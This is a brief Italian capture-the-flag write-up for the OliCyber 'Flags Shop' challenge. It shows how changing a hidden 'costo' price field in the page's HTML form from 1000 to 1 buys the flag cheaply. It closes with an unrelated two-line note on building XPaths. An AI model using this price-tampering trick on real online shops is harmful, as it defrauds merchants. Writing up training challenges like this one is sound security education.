# Flags Shop

http://shops.challs.olicyber.it/

## Spiegazione

Viene lasciato nel frontend il valore dal mandare al backend per quanto riguarda il costo delle bandiere.
Quindi basta modificare il frontend con un prezzo inferiore a quello di 100 e si riesce ad accedere alla bandiera voluta.

Letteralmente basta cambiare 
```
<form action="buy.php" method="POST" class="mt-2">
                            <input type="hidden" name="id" value="2">
                            <input type="hidden" name="costo" value="1000">
                            <button type="submit" class="btn btn-primary">ACQUISTA</button>
</form> 
```

in questo 
```
<form action="buy.php" method="POST" class="mt-2">
                            <input type="hidden" name="id" value="2">
                            <input type="hidden" name="costo" value="1"> cambio il prezzo!!!
                            <button type="submit" class="btn btn-primary">ACQUISTA</button>
</form> 
```



Percorrere al contrario fino alla radice?

Dato il nodo, percorro il percorso al contrario e costruisco un XPath che però è molto suscettibile al cambiamento di template